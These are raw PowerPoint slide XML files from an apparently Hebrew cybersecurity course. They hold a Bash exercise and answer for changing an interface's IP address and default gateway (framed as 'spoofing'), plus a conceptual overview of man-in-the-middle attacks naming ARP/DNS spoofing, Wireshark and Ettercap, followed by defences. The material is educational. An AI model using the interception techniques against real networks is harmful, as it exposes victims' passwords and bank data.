              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Bash</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t> לזיוף כתובת </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>IP</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t> ושער ברירת מחדל</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>כתבו סקריפט ב-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Bash  </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> שמשנה את כתובת ה-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> IP </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>של כרטיס רשת מסוים </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0">
                <a:highlight>
                  <a:srgbClr val="FFFF00"/>
                </a:highlight>
              </a:rPr>
              <a:t>ומשנה גם את שער ברירת המחדל </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:highlight>
                  <a:srgbClr val="FFFF00"/>
                </a:highlight>
              </a:rPr>
              <a:t>Default Gateway</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0">
                <a:highlight>
                  <a:srgbClr val="FFFF00"/>
                </a:highlight>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>הסקריפט צריך לקבל כקלט את שם כרטיס הרשת, כתובת ה-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>IP </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> החדשה, ומידע על שער ברירת המחדל</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>דרישות:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>הסקריפט צריך לקבל מהמשתמש את שם כרטיס הרשת כמו </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>eth0</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> או </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>wlan0</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>הסקריפט צריך לקבל מהמשתמש את כתובת ה-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>IP </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> החדשה ל- 192.168.1.100</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>הסקריפט צריך לקבל מהמשתמש את שער ברירת המחדל ל- 192.168.1.1</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>הסקריפט צריך לוודא שהמשתמש הוא </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>root</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> או בעל הרשאות מנהל.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>הסקריפט צריך לשנות את כתובת ה-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> IP </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>של כרטיס הרשת ושער ברירת המחדל בצורה בטוחה.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="76410133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59E7F22-8790-47C8-806C-842C9839715D}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3289852" y="264907"/>
            <a:ext cx="7835348" cy="1371600"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>המשך - זיוף כתובת</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> - IP </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>תשובה</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="מציין מיקום תוכן 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{E8D7C9C9-7E7B-4384-9076-C7AD0863F85A}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1066800" y="1381539"/>
            <a:ext cx="10058400" cy="5029199"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit fontScale="92500" lnSpcReduction="20000"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>התשובה דומה מאוד לתשובה עם כתובת ה- </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>MAC</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> אמנם ישנו שינוי קטן:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>if [[ $EUID -ne 0 ]]; then</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>   echo "This script must be run as root" </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>   exit 1</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>fi</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>read -p "Enter the network interface (e.g., eth0, wlan0): " interface</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>read -p "Enter the new IP address (e.g., 192.168.1.100): " </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>new_ip</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:highlight>
                  <a:srgbClr val="FFFF00"/>
                </a:highlight>
              </a:rPr>
              <a:t>read -p "Enter the default gateway (e.g., 192.168.1.1): " gateway</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>ifconfig $interface down</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>ifconfig $interface $</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>new_ip</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:highlight>
                  <a:srgbClr val="FFFF00"/>
                </a:highlight>
              </a:rPr>
              <a:t>route add default </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:highlight>
                  <a:srgbClr val="FFFF00"/>
                </a:highlight>
              </a:rPr>
              <a:t>gw</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:highlight>
                  <a:srgbClr val="FFFF00"/>
                </a:highlight>
              </a:rPr>
              <a:t> $gateway $interface</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>ifconfig $interface up</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>echo "The IP address for $interface has been changed to $</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>new_ip</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>"</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>echo "The default gateway for $interface has been changed to $gateway“</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>נסביר את השורות הצהובות:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="9313087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B40DD3-517F-4FC8-A88C-CF3D2AE7A325}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3240156" y="642594"/>
            <a:ext cx="7885043" cy="1371600"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>המשך - זיוף כתובת</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> - IP </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>תשובה</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="מציין מיקום תוכן 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{784FD575-64DE-4CC3-93EF-D4528957A3A2}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>שינוי שער ברירת המחדל</a:t>
            </a:r>
            <a:endParaRPr lang="he-IL" dirty="0">
              <a:highlight>
                <a:srgbClr val="FFFF00"/>
              </a:highlight>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:highlight>
                  <a:srgbClr val="FFFF00"/>
                </a:highlight>
              </a:rPr>
              <a:t>route add default </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:highlight>
                  <a:srgbClr val="FFFF00"/>
                </a:highlight>
              </a:rPr>
              <a:t>gw</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:highlight>
                  <a:srgbClr val="FFFF00"/>
                </a:highlight>
              </a:rPr>
              <a:t> $gateway $interface</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>הקוד הזה משנה את שער ברירת המחדל של כרטיס הרשת.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>קבלת קלט מהמשתמש</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:highlight>
                  <a:srgbClr val="FFFF00"/>
                </a:highlight>
              </a:rPr>
              <a:t>read -p "Enter the default gateway (e.g., 192.168.1.1): " gateway</a:t>
            </a:r>
            <a:endParaRPr lang="he-IL" dirty="0">
              <a:highlight>
                <a:srgbClr val="FFFF00"/>
              </a:highlight>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>קוד הזה מקבל את שער ברירת המחדל מהמשתמש.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="312378480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CD36BB13-6272-4531-A4B6-AC3C747126A8}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr"/>
            <a:r>
              <a:rPr lang="he-IL" sz="5400" dirty="0"/>
              <a:t>התקפת אמצע</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="ctr"/>
            <a:r>
              <a:rPr lang="he-IL" sz="5400" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="5400" dirty="0"/>
              <a:t>Man-in-the-Middle Attack</a:t>
            </a:r>
            <a:endParaRPr lang="he-IL" sz="5400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="31453516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B552EC3-F34D-4D4A-A236-9CE1A63EBC7B}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6096000" y="642594"/>
            <a:ext cx="5029200" cy="1371600"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>מהי התקפת אמצע?</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="מציין מיקום תוכן 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{45F321CD-6258-41A6-84AB-4028CA3E9299}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>התקפת אמצע היא סוג של התקפה במהלכה התוקף מתמקם בין שני צדדים מתקשרים ומשיג גישה למידע המועבר ביניהם מבלי שהם מודעים לכך. התוקף יכול לצפות, ליירט, לשנות ואף לזייף את התקשורת בין הצדדים.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>דוגמאות להמחשה</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>נניח שיש לנו את אליס ובוב שמתקשרים ביניהם. הם שולחים הודעות זה לזה ואינם יודעים שקרול, התוקפת, נמצאת באמצע ומאזינה או משנה את ההודעות המועברות.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="33485713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D7B71B-9AEC-4091-BA72-DE6081B21A94}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5347252" y="642594"/>
            <a:ext cx="5777948" cy="1371600"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>המשך – התקפת אמצע</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="מציין מיקום תוכן 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{7126C1AC-0A61-42E5-B531-EC88A36792D1}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>שלבים בהתקפת אמצע:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>יירוט התקשורת: התוקף מתמקם באמצע התקשורת באמצעות טכניקות שונות כמו </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> ARP Spoofing</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>או </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>DNS Spoofing</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>יירוט המידע: התוקף מקבל את המידע המועבר, יכול לשמור אותו לעצמו, לשנות אותו או להעבירו הלאה מבלי שהצדדים המתקשרים ישימו לב לכך.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>שינוי התקשורת: התוקף יכול לשנות את המידע המועבר בין הצדדים, למשל לשנות מספר חשבון בנק בהעברה בנקאית.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>התחזות: התוקף יכול להתחזות לצד אחד מהתקשורת מול הצד השני, כך שכל הודעה שתישלח אליו תגיע למעשה לתוקף.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="6152797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3DF175-55A9-4EFB-88EB-7B8357F591BD}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5257800" y="642594"/>
            <a:ext cx="5867400" cy="1371600"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>המשך – התקפת אמצע</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="מציין מיקום תוכן 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{E5E4D548-8B93-402B-A09D-1DC5F0D1FE9D}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>דוגמה </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0" err="1"/>
              <a:t>אמיתית</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>: התקפת אמצע ברשת </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Wi-Fi </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t> ציבורית</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>סיפור נפוץ הוא התקפת אמצע ברשתות </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Wi-Fi</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> ציבוריות כמו בבתי קפה. נניח שדן יושב בבית קפה ומשתמש ברשת ה-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> Wi-Fi </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>כדי לגשת לחשבון הבנק שלו. התוקף, יוסי, מחובר גם הוא לאותה רשת </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> Wi-Fi</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>ומבצע התקפת אמצע.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>יוסי יכול להשתמש בכלים כמו </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Wireshark</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> או </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Ettercap</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> כדי ליירט את התקשורת של דן עם הבנק, ולהשיג מידע רגיש כמו סיסמאות או פרטי חשבון בנק.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="31641242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CCB2F06-309B-44BE-A16D-A856EE1CFA0A}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5227982" y="642594"/>
            <a:ext cx="5897217" cy="1371600"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>המשך – התקפת אמצע</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="מציין מיקום תוכן 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{D8CDF883-D029-4F5F-A562-B9B03376105A}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>הגנות מפני התקפת אמצע</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>הצפנת תקשורת </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> :TLS/SSL</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>שימוש בהצפנה מבטיח שגם אם התוקף יירט את התקשורת, הוא לא יוכל לפענח את המידע המוצפן.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>אימות דו שלבי: שימוש באימות דו שלבי מוסיף שכבת אבטחה נוספת שמקשה על התוקף לגנוב זהות.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> :VPN</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>שימוש ב-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> VPN </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>מצפין את התקשורת ומקשה על התוקף ליירט או לשנות את התעבורה.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>הימנעות מרשתות ציבוריות לא מאובטחות: אם אין ברירה אלא להשתמש ברשת ציבורית, כדאי להימנע מגישה למידע רגיש כמו חשבונות בנק או סיסמאות.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
